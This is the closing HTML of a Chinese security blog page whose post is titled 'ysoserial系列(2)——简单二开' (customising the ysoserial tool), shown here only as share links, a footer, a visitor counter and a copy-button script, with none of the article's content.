  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/&text=ysoserial系列(2)——简单二开"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/&title=ysoserial系列(2)——简单二开"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/&is_video=false&description=ysoserial系列(2)——简单二开"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ysoserial系列(2)——简单二开&body=Check out this article: http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/&title=ysoserial系列(2)——简单二开"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/&title=ysoserial系列(2)——简单二开"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/&title=ysoserial系列(2)——简单二开"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/&title=ysoserial系列(2)——简单二开"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/&name=ysoserial系列(2)——简单二开&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/&t=ysoserial系列(2)——简单二开"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
      <div class="footer-left">
        Copyright &copy;
        
        
        2016-2025
        John Doe
      </div>
      <div class="footer-right">
        <nav>
          <ul>
            <!--
          --><li><a href="/">首页</a></li><!--
        --><!--
          --><li><a href="/about/">关于</a></li><!--
        --><!--
          --><li><a href="/archives/">归档</a></li><!--
        --><!--
          --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
        -->
          </ul>
          <ul>
            
              <!-- 不蒜子统计 -->
              <span id="busuanzi_container_site_pv">
                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
              </span>
              <span class="post-meta-divider">|</span>
              <span id="busuanzi_container_site_uv" style='display:none'>
                      本站访客数<span id="busuanzi_value_site_uv"></span>人
              </span>
            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            
          </ul>
        </nav>
      </div>
      
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
